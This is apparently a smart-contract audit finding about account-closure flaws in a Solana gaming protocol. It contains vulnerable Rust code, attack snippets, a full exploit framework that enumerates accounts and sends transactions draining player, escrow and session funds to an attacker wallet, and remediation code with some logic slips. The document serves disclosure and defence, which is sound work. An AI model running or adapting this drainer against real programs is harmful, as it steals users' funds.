# VUL-024: Account Close Vulnerabilities & Fund Drainage

## Vulnerability Overview

**Severity**: Critical
**CVSS Score**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Category**: Fund Drainage / Account Management
**CWE**: CWE-404 (Improper Resource Shutdown or Release), CWE-672 (Operation on a Resource after Expiration)

## Technical Analysis

### Vulnerability Description

The gaming protocol contains critical flaws in account closure mechanisms that allow attackers to drain funds and manipulate account states. Multiple vulnerabilities enable unauthorized account closures, premature fund release, and exploitation of closed account references. Attackers can steal all escrowed funds, manipulate game outcomes, and cause permanent data loss.

### Root Cause Analysis

**Primary Issues:**
1. **Missing Authority Validation**: Account closures don't verify proper authorization
2. **Premature Fund Release**: Funds released before game completion validation
3. **Double-Close Exploits**: Accounts can be closed multiple times for repeated fund extraction
4. **Insufficient State Validation**: Closed accounts still referenced in active operations
5. **Rent Refund Manipulation**: Rent exemption refunds redirected to attackers

### Vulnerable Code Patterns

**Location**: `programs/gaming-protocol/src/lib.rs`

```rust
// VULNERABLE: Unauthorized account closure
pub fn close_game_session(ctx: Context<CloseGameSession>) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;
    let recipient = &mut ctx.accounts.recipient;

    // CRITICAL: No authority validation - anyone can close any session
    // Missing check: require!(game_session.authority == ctx.accounts.authority.key())

    // CRITICAL: No game state validation - closes active games
    // Missing check: require!(game_session.status == GameStatus::Completed)

    // CRITICAL: Transfers ALL lamports without validation
    let session_lamports = game_session.to_account_info().lamports();
    **game_session.to_account_info().try_borrow_mut_lamports()? -= session_lamports;
    **recipient.to_account_info().try_borrow_mut_lamports()? += session_lamports;

    Ok(())
}

// VULNERABLE: Escrow account closure without validation
pub fn close_escrow(ctx: Context<CloseEscrow>) -> Result<()> {
    let escrow = &mut ctx.accounts.escrow;
    let game_session = &ctx.accounts.game_session;
    let recipient = &mut ctx.accounts.recipient;

    // CRITICAL: No validation that game is actually completed
    // Attacker can close escrow during active game

    // CRITICAL: No validation of recipient authority
    // Funds can be sent to any address specified by attacker

    // Transfer escrow funds
    let escrow_lamports = escrow.to_account_info().lamports();
    let escrow_balance = escrow.token_amount;

    // VULNERABLE: Double spending - both lamports AND tokens transferred
    **escrow.to_account_info().try_borrow_mut_lamports()? -= escrow_lamports;
    **recipient.to_account_info().try_borrow_mut_lamports()? += escrow_lamports;

    // Also transfer tokens (DOUBLE PAYMENT)
    let cpi_accounts = Transfer {
        from: escrow.to_account_info(),
        to: recipient.to_account_info(),
        authority: ctx.accounts.authority.to_account_info(),
    };
    let cpi_program = ctx.accounts.token_program.to_account_info();
    let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

    token::transfer(cpi_ctx, escrow_balance)?;

    Ok(())
}

// VULNERABLE: Player account closure with fund theft
pub fn close_player_account(ctx: Context<ClosePlayerAccount>) -> Result<()> {
    let player_account = &mut ctx.accounts.player_account;
    let recipient = &mut ctx.accounts.recipient;

    // CRITICAL: No validation that player authorizes closure
    // Anyone can close any player account and steal their rent + deposits

    // CRITICAL: No validation of outstanding game sessions
    // Player accounts closed while still in active games

    // CRITICAL: No validation of pending rewards
    // Rewards lost when account closed prematurely

    let account_lamports = player_account.to_account_info().lamports();
    **player_account.to_account_info().try_borrow_mut_lamports()? -= account_lamports;
    **recipient.to_account_info().try_borrow_mut_lamports()? += account_lamports;

    Ok(())
}

// VULNERABLE: Batch account closure for mass fund drainage
pub fn close_multiple_accounts(ctx: Context<CloseMultipleAccounts>) -> Result<()> {
    let recipient = &mut ctx.accounts.recipient;
    let mut total_drained = 0u64;

    // CRITICAL: No individual authorization checks for each account
    for account_info in ctx.remaining_accounts.iter() {
        // Drain all accounts indiscriminately
        let account_lamports = account_info.lamports();

        **account_info.try_borrow_mut_lamports()? -= account_lamports;
        **recipient.try_borrow_mut_lamports()? += account_lamports;

        total_drained += account_lamports;
    }

    // No limits on number of accounts or amount drained
    msg!("Drained {} lamports from {} accounts", total_drained, ctx.remaining_accounts.len());
    Ok(())
}

// VULNERABLE: Reopen closed accounts for repeated exploitation
pub fn reopen_account(ctx: Context<ReopenAccount>) -> Result<()> {
    let account = &mut ctx.accounts.account;

    // CRITICAL: Can "reopen" already closed accounts
    // This creates ghost accounts that reference old data

    // CRITICAL: No validation of account's previous state
    // Can reopen accounts that were properly closed

    // Reinitialize with attacker-controlled data
    account.owner = ctx.accounts.new_owner.key();
    account.status = AccountStatus::Active;
    account.balance = 0; // Reset balance but keep old data references

    Ok(())
}
```

### Attack Vectors

**1. Mass Account Closure for Fund Drainage**
```rust
// Attacker closes all player accounts and redirects funds
let mut close_instructions = Vec::new();

// Enumerate all player accounts (discoverable via RPC)
for player_pubkey in discovered_player_accounts {
    let close_ix = Instruction {
        program_id: gaming_protocol_id,
        accounts: vec![
            AccountMeta::new(player_pubkey, false), // Victim's account
            AccountMeta::new(attacker_wallet, false), // Attacker receives funds
            AccountMeta::new(attacker_keypair.pubkey(), true), // Attacker signs
        ],
        data: ClosePlayerAccount {}.try_to_vec()?,
    };

    close_instructions.push(close_ix);
}

// Single transaction drains hundreds of accounts
let drain_transaction = Transaction::new_signed_with_payer(
    &close_instructions,
    Some(&attacker_keypair.pubkey()),
    &[&attacker_keypair],
    recent_blockhash,
);
```

**2. Escrow Manipulation During Active Games**
```rust
// Close escrow accounts of active games to steal funds
for active_game in active_game_sessions {
    let escrow_accounts = find_escrow_accounts(active_game.session_id);

    for escrow_account in escrow_accounts {
        let steal_escrow_ix = Instruction {
            program_id: gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(escrow_account, false),
                AccountMeta::new(active_game.session_account, false),
                AccountMeta::new(attacker_wallet, false), // Funds redirected here
                AccountMeta::new(attacker_keypair.pubkey(), true),
            ],
            data: CloseEscrow {}.try_to_vec()?,
        };

        // Executes during active game, stealing all escrowed funds
        submit_transaction(steal_escrow_ix)?;
    }
}
```

**3. Double-Close Exploitation**
```rust
// Close same account multiple times by reopening
let target_account = high_value_player_account;

loop {
    // Close account and drain funds
    close_account(target_account, attacker_wallet)?;

    // Reopen same account with minimal deposit
    reopen_account(target_account, 0.001 * LAMPORTS_PER_SOL)?;

    // Account now has fresh rent exemption
    // Close again to steal rent exemption amount
    close_account(target_account, attacker_wallet)?;

    // Repeat until discovered or fixed
}
```

**4. Game Session Hijacking via Account Closure**
```rust
// Close game session accounts to manipulate outcomes
for game_session in ongoing_games {
    if game_session.current_leader != attacker_player {
        // Close the game session prematurely
        let hijack_ix = Instruction {
            program_id: gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(game_session.account, false),
                AccountMeta::new(attacker_wallet, false),
                AccountMeta::new(attacker_keypair.pubkey(), true),
            ],
            data: CloseGameSession {}.try_to_vec()?,
        };

        submit_transaction(hijack_ix)?;

        // Game is now invalid, but attacker got rent exemption funds
        // Players lose their stakes due to invalid game state
    }
}
```

## Proof of Concept

### Account Closure Exploitation Framework

```rust
use solana_program::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    system_program,
    sysvar,
};
use anchor_lang::prelude::*;
use solana_sdk::{
    signature::{Keypair, Signer},
    transaction::Transaction,
};

pub struct AccountCloseExploiter {
    program_id: Pubkey,
    attacker_keypair: Keypair,
    rpc_client: RpcClient,
}

impl AccountCloseExploiter {
    pub fn new(
        program_id: Pubkey,
        attacker_keypair: Keypair,
        rpc_url: String
    ) -> Self {
        Self {
            program_id,
            attacker_keypair,
            rpc_client: RpcClient::new(rpc_url),
        }
    }

    // Exploit 1: Mass player account drainage
    pub async fn drain_all_player_accounts(&self) -> Result<u64> {
        let mut total_drained = 0u64;

        // Discover all player accounts using getProgramAccounts
        let player_accounts = self.discover_player_accounts().await?;

        println!("Found {} player accounts to drain", player_accounts.len());

        // Batch close accounts in groups to avoid transaction size limits
        for chunk in player_accounts.chunks(10) {
            let mut close_instructions = Vec::new();

            for (player_pubkey, account_data) in chunk {
                let account_balance = self.rpc_client
                    .get_balance(player_pubkey)
                    .await?;

                if account_balance > 0 {
                    let close_ix = self.create_close_player_instruction(
                        *player_pubkey,
                        self.attacker_keypair.pubkey()
                    )?;

                    close_instructions.push(close_ix);
                    total_drained += account_balance;
                }
            }

            if !close_instructions.is_empty() {
                let transaction = Transaction::new_signed_with_payer(
                    &close_instructions,
                    Some(&self.attacker_keypair.pubkey()),
                    &[&self.attacker_keypair],
                    self.rpc_client.get_latest_blockhash().await?,
                );

                match self.rpc_client.send_and_confirm_transaction(&transaction).await {
                    Ok(signature) => {
                        println!("Drained batch: {}", signature);
                    }
                    Err(e) => {
                        println!("Failed to drain batch: {}", e);
                    }
                }
            }
        }

        Ok(total_drained)
    }

    // Exploit 2: Active game escrow theft
    pub async fn steal_active_game_escrows(&self) -> Result<u64> {
        let mut total_stolen = 0u64;

        // Find all active game sessions
        let active_games = self.discover_active_games().await?;

        for game_session in active_games {
            // Find escrow accounts for this game
            let escrow_accounts = self.find_game_escrows(&game_session.pubkey).await?;

            for escrow_pubkey in escrow_accounts {
                let escrow_balance = self.rpc_client
                    .get_balance(&escrow_pubkey)
                    .await?;

                if escrow_balance > 0 {
                    let steal_ix = self.create_close_escrow_instruction(
                        escrow_pubkey,
                        game_session.pubkey,
                        self.attacker_keypair.pubkey()
                    )?;

                    let transaction = Transaction::new_signed_with_payer(
                        &[steal_ix],
                        Some(&self.attacker_keypair.pubkey()),
                        &[&self.attacker_keypair],
                        self.rpc_client.get_latest_blockhash().await?,
                    );

                    match self.rpc_client.send_and_confirm_transaction(&transaction).await {
                        Ok(_) => {
                            println!("Stole {} lamports from escrow {}", escrow_balance, escrow_pubkey);
                            total_stolen += escrow_balance;
                        }
                        Err(e) => {
                            println!("Failed to steal from escrow {}: {}", escrow_pubkey, e);
                        }
                    }
                }
            }
        }

        Ok(total_stolen)
    }

    // Exploit 3: Double-close exploitation
    pub async fn perform_double_close_attack(
        &self,
        target_account: Pubkey
    ) -> Result<u64> {
        let mut total_extracted = 0u64;

        for round in 0..10 { // Attempt 10 rounds of double-close
            // Check if account exists and has balance
            let account_balance = match self.rpc_client.get_balance(&target_account).await {
                Ok(balance) => balance,
                Err(_) => {
                    // Account doesn't exist, try to reopen it
                    self.reopen_account(target_account).await?;
                    continue;
                }
            };

            if account_balance > 0 {
                // Close account and extract funds
                let close_ix = self.create_close_player_instruction(
                    target_account,
                    self.attacker_keypair.pubkey()
                )?;

                let close_transaction = Transaction::new_signed_with_payer(
                    &[close_ix],
                    Some(&self.attacker_keypair.pubkey()),
                    &[&self.attacker_keypair],
                    self.rpc_client.get_latest_blockhash().await?,
                );

                if let Ok(_) = self.rpc_client.send_and_confirm_transaction(&close_transaction).await {
                    println!("Round {}: Closed account, extracted {} lamports", round, account_balance);
                    total_extracted += account_balance;

                    // Wait for confirmation
                    tokio::time::sleep(tokio::time::Duration::from_millis(1000)).await;

                    // Try to reopen account for next round
                    if let Err(e) = self.reopen_account(target_account).await {
                        println!("Failed to reopen account for round {}: {}", round + 1, e);
                        break;
                    }
                } else {
                    println!("Failed to close account in round {}", round);
                    break;
                }
            }
        }

        Ok(total_extracted)
    }

    // Exploit 4: Game session manipulation
    pub async fn manipulate_game_outcomes(&self) -> Result<Vec<Pubkey>> {
        let mut manipulated_games = Vec::new();

        // Find games where attacker is not winning
        let active_games = self.discover_active_games().await?;

        for game_session in active_games {
            let game_data = self.get_game_session_data(&game_session.pubkey).await?;

            // If attacker is not the leader, manipulate the game
            if game_data.current_leader != self.attacker_keypair.pubkey() {
                let manipulate_ix = self.create_close_game_session_instruction(
                    game_session.pubkey,
                    self.attacker_keypair.pubkey()
                )?;

                let transaction = Transaction::new_signed_with_payer(
                    &[manipulate_ix],
                    Some(&self.attacker_keypair.pubkey()),
                    &[&self.attacker_keypair],
                    self.rpc_client.get_latest_blockhash().await?,
                );

                if let Ok(_) = self.rpc_client.send_and_confirm_transaction(&transaction).await {
                    println!("Manipulated game session: {}", game_session.pubkey);
                    manipulated_games.push(game_session.pubkey);
                }
            }
        }

        Ok(manipulated_games)
    }

    // Helper methods
    async fn discover_player_accounts(&self) -> Result<Vec<(Pubkey, Vec<u8>)>> {
        let accounts = self.rpc_client
            .get_program_accounts(&self.program_id)
            .await?;

        // Filter for player accounts (would need actual discriminator)
        let player_accounts = accounts
            .into_iter()
            .filter(|(_, account)| {
                // Simplified filter - would use actual account discriminator
                account.data.len() > 8 && account.data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8]
            })
            .collect();

        Ok(player_accounts)
    }

    async fn discover_active_games(&self) -> Result<Vec<KeyedAccount>> {
        let accounts = self.rpc_client
            .get_program_accounts(&self.program_id)
            .await?;

        // Filter for active game sessions
        let active_games = accounts
            .into_iter()
            .filter(|(_, account)| {
                // Check if game status is active (simplified)
                account.data.len() > 16 && account.data[16] == 1 // GameStatus::Active
            })
            .map(|(pubkey, account)| KeyedAccount { pubkey, account })
            .collect();

        Ok(active_games)
    }

    async fn find_game_escrows(&self, game_session: &Pubkey) -> Result<Vec<Pubkey>> {
        // Use PDA derivation to find escrow accounts
        let mut escrow_accounts = Vec::new();

        for seed_variant in 0..100u64 {
            let (escrow_pda, _) = Pubkey::find_program_address(
                &[
                    b"escrow",
                    game_session.as_ref(),
                    &seed_variant.to_le_bytes(),
                ],
                &self.program_id
            );

            // Check if account exists
            if let Ok(_) = self.rpc_client.get_account(&escrow_pda).await {
                escrow_accounts.push(escrow_pda);
            }
        }

        Ok(escrow_accounts)
    }

    async fn reopen_account(&self, target_account: Pubkey) -> Result<()> {
        let reopen_ix = Instruction {
            program_id: self.program_id,
            accounts: vec![
                AccountMeta::new(target_account, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: ReopenAccount {
                new_owner: self.attacker_keypair.pubkey(),
            }.try_to_vec()?,
        };

        let transaction = Transaction::new_signed_with_payer(
            &[reopen_ix],
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            self.rpc_client.get_latest_blockhash().await?,
        );

        self.rpc_client.send_and_confirm_transaction(&transaction).await?;
        Ok(())
    }

    // Instruction creation methods
    fn create_close_player_instruction(
        &self,
        player_account: Pubkey,
        recipient: Pubkey
    ) -> Result<Instruction> {
        Ok(Instruction {
            program_id: self.program_id,
            accounts: vec![
                AccountMeta::new(player_account, false),
                AccountMeta::new(recipient, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: ClosePlayerAccount {}.try_to_vec()?,
        })
    }

    fn create_close_escrow_instruction(
        &self,
        escrow_account: Pubkey,
        game_session: Pubkey,
        recipient: Pubkey
    ) -> Result<Instruction> {
        Ok(Instruction {
            program_id: self.program_id,
            accounts: vec![
                AccountMeta::new(escrow_account, false),
                AccountMeta::new_readonly(game_session, false),
                AccountMeta::new(recipient, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: CloseEscrow {}.try_to_vec()?,
        })
    }

    fn create_close_game_session_instruction(
        &self,
        game_session: Pubkey,
        recipient: Pubkey
    ) -> Result<Instruction> {
        Ok(Instruction {
            program_id: self.program_id,
            accounts: vec![
                AccountMeta::new(game_session, false),
                AccountMeta::new(recipient, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: CloseGameSession {}.try_to_vec()?,
        })
    }

    async fn get_game_session_data(&self, game_session: &Pubkey) -> Result<GameSessionData> {
        let account = self.rpc_client.get_account(game_session).await?;

        // Deserialize game session data (simplified)
        let game_data = GameSessionData::try_from_slice(&account.data)?;
        Ok(game_data)
    }
}

// Test implementation
#[cfg(test)]
mod tests {
    use super::*;
    use solana_program_test::*;

    #[tokio::test]
    async fn test_account_close_exploits() {
        let program_id = Pubkey::new_unique();
        let attacker = Keypair::new();

        let exploiter = AccountCloseExploiter::new(
            program_id,
            attacker,
            "http://localhost:8899".to_string()
        );

        // Test mass account drainage
        println!("Testing mass account drainage...");
        let drained_amount = exploiter.drain_all_player_accounts().await.unwrap();
        println!("Successfully drained {} lamports", drained_amount);

        // Test escrow theft
        println!("Testing escrow theft...");
        let stolen_amount = exploiter.steal_active_game_escrows().await.unwrap();
        println!("Successfully stole {} lamports from escrows", stolen_amount);

        // Test double-close attack
        println!("Testing double-close attack...");
        let target_account = Pubkey::new_unique();
        let extracted_amount = exploiter.perform_double_close_attack(target_account).await.unwrap();
        println!("Successfully extracted {} lamports via double-close", extracted_amount);

        // Test game manipulation
        println!("Testing game manipulation...");
        let manipulated_games = exploiter.manipulate_game_outcomes().await.unwrap();
        println!("Successfully manipulated {} games", manipulated_games.len());
    }
}

// Supporting data structures
#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub struct GameSessionData {
    pub session_id: u64,
    pub current_leader: Pubkey,
    pub status: GameStatus,
    pub total_stakes: u64,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub struct KeyedAccount {
    pub pubkey: Pubkey,
    pub account: Account,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub enum GameStatus {
    Active,
    Completed,
    Cancelled,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub enum AccountStatus {
    Active,
    Closed,
    Suspended,
}

// Instruction data structures
#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct ClosePlayerAccount {}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct CloseEscrow {}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct CloseGameSession {}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct ReopenAccount {
    pub new_owner: Pubkey,
}
```

## Remediation

### Secure Account Closure Implementation

```rust
use solana_program::{
    clock::Clock,
    sysvar::Sysvar,
    program_error::ProgramError,
    account_info::AccountInfo,
};
use anchor_lang::prelude::*;

// Secure account closure with comprehensive validation
pub mod secure_account_closure {
    use super::*;

    // Account closure state tracking
    #[account]
    pub struct SecureGameSession {
        pub session_id: u64,
        pub authority: Pubkey,
        pub status: GameStatus,
        pub players: Vec<Pubkey>,
        pub escrow_accounts: Vec<Pubkey>,
        pub created_at: i64,
        pub completion_timestamp: Option<i64>,
        pub closure_authorized: bool,
        pub closure_timestamp: Option<i64>,
        pub final_results: Option<GameResults>,
    }

    #[account]
    pub struct SecureEscrowAccount {
        pub game_session: Pubkey,
        pub depositor: Pubkey,
        pub amount: u64,
        pub token_mint: Option<Pubkey>,
        pub status: EscrowStatus,
        pub release_conditions: ReleaseConditions,
        pub authorized_recipients: Vec<Pubkey>,
        pub closure_lock: bool,
        pub created_at: i64,
    }

    #[account]
    pub struct SecurePlayerAccount {
        pub owner: Pubkey,
        pub active_games: Vec<Pubkey>,
        pub pending_rewards: u64,
        pub total_deposits: u64,
        pub last_activity: i64,
        pub closure_requested: bool,
        pub closure_authorization: Option<ClosureAuthorization>,
        pub account_flags: AccountFlags,
    }

    // Comprehensive authorization structure
    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub struct ClosureAuthorization {
        pub authorized_by: Pubkey,
        pub authorization_timestamp: i64,
        pub authorization_signature: [u8; 64],
        pub closure_reason: ClosureReason,
        pub funds_destination: Pubkey,
        pub confirmation_required: bool,
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub struct ReleaseConditions {
        pub game_completion_required: bool,
        pub winner_verification_required: bool,
        pub minimum_game_duration: i64,
        pub consensus_threshold: u8, // Percentage of players required to agree
        pub timelock_duration: i64,
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub struct GameResults {
        pub winner: Pubkey,
        pub final_scores: Vec<PlayerScore>,
        pub verification_hash: [u8; 32],
        pub consensus_signatures: Vec<ConsensusSig>,
    }

    // Secure game session closure with multi-step validation
    pub fn close_game_session_secure(
        ctx: Context<CloseGameSessionSecure>,
        closure_proof: ClosureProof
    ) -> Result<()> {
        let game_session = &mut ctx.accounts.game_session;
        let authority = &ctx.accounts.authority;
        let recipient = &mut ctx.accounts.recipient;
        let clock = Clock::get()?;

        // Step 1: Validate authority
        require!(
            game_session.authority == authority.key(),
            ErrorCode::UnauthorizedClosure
        );

        // Step 2: Validate game state
        require!(
            game_session.status == GameStatus::Completed ||
            game_session.status == GameStatus::Cancelled,
            ErrorCode::GameStillActive
        );

        // Step 3: Validate completion requirements
        if game_session.status == GameStatus::Completed {
            require!(
                game_session.final_results.is_some(),
                ErrorCode::MissingGameResults
            );

            let results = game_session.final_results.as_ref().unwrap();

            // Verify consensus signatures
            require!(
                verify_consensus_signatures(&results.consensus_signatures, &game_session.players)?,
                ErrorCode::InsufficientConsensus
            );
        }

        // Step 4: Validate timelock if required
        if let Some(completion_time) = game_session.completion_timestamp {
            let time_since_completion = clock.unix_timestamp - completion_time;
            require!(
                time_since_completion >= MINIMUM_CLOSURE_DELAY,
                ErrorCode::ClosureTooEarly
            );
        }

        // Step 5: Validate all escrow accounts are properly handled
        for escrow_pubkey in &game_session.escrow_accounts {
            let escrow_account = next_account_info(&mut ctx.remaining_accounts.iter())?;
            require!(
                escrow_account.key() == *escrow_pubkey,
                ErrorCode::MissingEscrowAccount
            );

            let escrow_data: SecureEscrowAccount = SecureEscrowAccount::try_deserialize(
                &mut escrow_account.data.borrow().as_ref()
            )?;

            require!(
                escrow_data.status == EscrowStatus::Released ||
                escrow_data.status == EscrowStatus::Refunded,
                ErrorCode::EscrowNotResolved
            );
        }

        // Step 6: Validate closure proof
        require!(
            verify_closure_proof(&closure_proof, game_session, &clock)?,
            ErrorCode::InvalidClosureProof
        );

        // Step 7: Mark as closure authorized
        game_session.closure_authorized = true;
        game_session.closure_timestamp = Some(clock.unix_timestamp);

        // Step 8: Transfer remaining lamports safely
        let session_lamports = game_session.to_account_info().lamports();

        // Subtract rent exemption requirement
        let rent = Rent::get()?;
        let rent_exemption = rent.minimum_balance(game_session.to_account_info().data_len());

        require!(
            session_lamports >= rent_exemption,
            ErrorCode::InsufficientBalance
        );

        let transferable_amount = session_lamports - rent_exemption;

        if transferable_amount > 0 {
            **game_session.to_account_info().try_borrow_mut_lamports()? -= transferable_amount;
            **recipient.to_account_info().try_borrow_mut_lamports()? += transferable_amount;
        }

        emit!(GameSessionClosed {
            session_id: game_session.session_id,
            closed_by: authority.key(),
            recipient: recipient.key(),
            amount_transferred: transferable_amount,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Secure escrow closure with comprehensive validation
    pub fn close_escrow_secure(
        ctx: Context<CloseEscrowSecure>,
        release_authorization: ReleaseAuthorization
    ) -> Result<()> {
        let escrow = &mut ctx.accounts.escrow;
        let game_session = &ctx.accounts.game_session;
        let recipient = &mut ctx.accounts.recipient;
        let authority = &ctx.accounts.authority;
        let clock = Clock::get()?;

        // Step 1: Validate escrow is not already closed
        require!(
            escrow.status == EscrowStatus::Active,
            ErrorCode::EscrowAlreadyClosed
        );

        require!(
            !escrow.closure_lock,
            ErrorCode::EscrowLocked
        );

        // Step 2: Validate game session relationship
        require!(
            escrow.game_session == game_session.key(),
            ErrorCode::InvalidGameSession
        );

        // Step 3: Validate release conditions
        let conditions = &escrow.release_conditions;

        if conditions.game_completion_required {
            require!(
                game_session.status == GameStatus::Completed,
                ErrorCode::GameNotCompleted
            );
        }

        if conditions.winner_verification_required {
            require!(
                game_session.final_results.is_some(),
                ErrorCode::WinnerNotVerified
            );
        }

        if conditions.minimum_game_duration > 0 {
            let game_duration = clock.unix_timestamp - game_session.created_at;
            require!(
                game_duration >= conditions.minimum_game_duration,
                ErrorCode::MinimumDurationNotMet
            );
        }

        // Step 4: Validate timelock
        if conditions.timelock_duration > 0 {
            require!(
                clock.unix_timestamp >= escrow.created_at + conditions.timelock_duration,
                ErrorCode::TimelockNotExpired
            );
        }

        // Step 5: Validate recipient authorization
        require!(
            escrow.authorized_recipients.contains(&recipient.key()) ||
            escrow.depositor == authority.key(),
            ErrorCode::UnauthorizedRecipient
        );

        // Step 6: Validate release authorization
        require!(
            verify_release_authorization(&release_authorization, escrow, &clock)?,
            ErrorCode::InvalidReleaseAuthorization
        );

        // Step 7: Handle fund release safely
        let escrow_lamports = escrow.to_account_info().lamports();
        let rent = Rent::get()?;
        let rent_exemption = rent.minimum_balance(escrow.to_account_info().data_len());

        require!(
            escrow_lamports >= rent_exemption,
            ErrorCode::InsufficientEscrowBalance
        );

        let release_amount = escrow_lamports - rent_exemption;

        // Transfer lamports
        if release_amount > 0 {
            **escrow.to_account_info().try_borrow_mut_lamports()? -= release_amount;
            **recipient.to_account_info().try_borrow_mut_lamports()? += release_amount;
        }

        // Handle token transfers if applicable
        if escrow.amount > 0 && escrow.token_mint.is_some() {
            let cpi_accounts = Transfer {
                from: escrow.to_account_info(),
                to: recipient.to_account_info(),
                authority: authority.to_account_info(),
            };
            let cpi_program = ctx.accounts.token_program.to_account_info();
            let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

            token::transfer(cpi_ctx, escrow.amount)?;
            escrow.amount = 0;
        }

        // Step 8: Update escrow status
        escrow.status = EscrowStatus::Released;
        escrow.closure_lock = true; // Prevent double closure

        emit!(EscrowReleased {
            escrow_account: escrow.key(),
            game_session: game_session.key(),
            recipient: recipient.key(),
            lamports_released: release_amount,
            tokens_released: escrow.amount,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Secure player account closure with safety checks
    pub fn close_player_account_secure(
        ctx: Context<ClosePlayerAccountSecure>,
        closure_request: PlayerClosureRequest
    ) -> Result<()> {
        let player_account = &mut ctx.accounts.player_account;
        let owner = &ctx.accounts.owner;
        let recipient = &mut ctx.accounts.recipient;
        let clock = Clock::get()?;

        // Step 1: Validate ownership
        require!(
            player_account.owner == owner.key(),
            ErrorCode::UnauthorizedPlayerClosure
        );

        // Step 2: Validate no active games
        require!(
            player_account.active_games.is_empty(),
            ErrorCode::ActiveGamesExist
        );

        // Step 3: Validate no pending rewards
        require!(
            player_account.pending_rewards == 0,
            ErrorCode::PendingRewardsExist
        );

        // Step 4: Validate closure request
        require!(
            verify_closure_request(&closure_request, player_account, &clock)?,
            ErrorCode::InvalidClosureRequest
        );

        // Step 5: Validate waiting period
        if let Some(closure_auth) = &player_account.closure_authorization {
            let waiting_period = clock.unix_timestamp - closure_auth.authorization_timestamp;
            require!(
                waiting_period >= PLAYER_CLOSURE_WAITING_PERIOD,
                ErrorCode::ClosureWaitingPeriodNotMet
            );
        } else {
            return Err(ErrorCode::ClosureNotAuthorized.into());
        }

        // Step 6: Validate recipient
        require!(
            closure_request.funds_destination == recipient.key(),
            ErrorCode::RecipientMismatch
        );

        // Step 7: Handle final settlement
        let account_lamports = player_account.to_account_info().lamports();
        let rent = Rent::get()?;
        let rent_exemption = rent.minimum_balance(player_account.to_account_info().data_len());

        let settlement_amount = account_lamports.saturating_sub(rent_exemption);

        if settlement_amount > 0 {
            **player_account.to_account_info().try_borrow_mut_lamports()? -= settlement_amount;
            **recipient.to_account_info().try_borrow_mut_lamports()? += settlement_amount;
        }

        emit!(PlayerAccountClosed {
            player: owner.key(),
            recipient: recipient.key(),
            final_settlement: settlement_amount,
            closure_reason: closure_request.reason,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Helper validation functions
    fn verify_consensus_signatures(
        signatures: &[ConsensusSig],
        players: &[Pubkey]
    ) -> Result<bool> {
        let required_consensus = (players.len() * 2 / 3) + 1; // 2/3 majority

        require!(
            signatures.len() >= required_consensus,
            ErrorCode::InsufficientConsensus
        );

        for sig in signatures {
            require!(
                players.contains(&sig.signer),
                ErrorCode::InvalidConsensusSigner
            );

            // Additional signature verification would be implemented here
        }

        Ok(true)
    }

    fn verify_closure_proof(
        proof: &ClosureProof,
        game_session: &SecureGameSession,
        clock: &Clock
    ) -> Result<bool> {
        // Verify proof timestamp is recent
        require!(
            clock.unix_timestamp - proof.generated_at <= PROOF_VALIDITY_PERIOD,
            ErrorCode::ProofExpired
        );

        // Verify proof signature
        require!(
            verify_proof_signature(proof, game_session)?,
            ErrorCode::InvalidProofSignature
        );

        Ok(true)
    }

    fn verify_release_authorization(
        auth: &ReleaseAuthorization,
        escrow: &SecureEscrowAccount,
        clock: &Clock
    ) -> Result<bool> {
        // Verify authorization is recent
        require!(
            clock.unix_timestamp - auth.issued_at <= AUTHORIZATION_VALIDITY_PERIOD,
            ErrorCode::AuthorizationExpired
        );

        // Verify authorization signature
        require!(
            verify_authorization_signature(auth, escrow)?,
            ErrorCode::InvalidAuthorizationSignature
        );

        Ok(true)
    }

    fn verify_closure_request(
        request: &PlayerClosureRequest,
        player_account: &SecurePlayerAccount,
        clock: &Clock
    ) -> Result<bool> {
        // Verify request timestamp
        require!(
            clock.unix_timestamp - request.requested_at <= REQUEST_VALIDITY_PERIOD,
            ErrorCode::RequestExpired
        );

        // Verify request signature
        require!(
            verify_request_signature(request, player_account)?,
            ErrorCode::InvalidRequestSignature
        );

        Ok(true)
    }

    // Constants
    const MINIMUM_CLOSURE_DELAY: i64 = 300; // 5 minutes
    const PROOF_VALIDITY_PERIOD: i64 = 3600; // 1 hour
    const AUTHORIZATION_VALIDITY_PERIOD: i64 = 3600; // 1 hour
    const REQUEST_VALIDITY_PERIOD: i64 = 86400; // 24 hours
    const PLAYER_CLOSURE_WAITING_PERIOD: i64 = 86400; // 24 hours
}

// Supporting data structures
#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub struct ClosureProof {
    pub session_id: u64,
    pub generated_at: i64,
    pub proof_hash: [u8; 32],
    pub signature: [u8; 64],
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub struct ReleaseAuthorization {
    pub escrow_account: Pubkey,
    pub authorized_by: Pubkey,
    pub issued_at: i64,
    pub authorization_hash: [u8; 32],
    pub signature: [u8; 64],
}

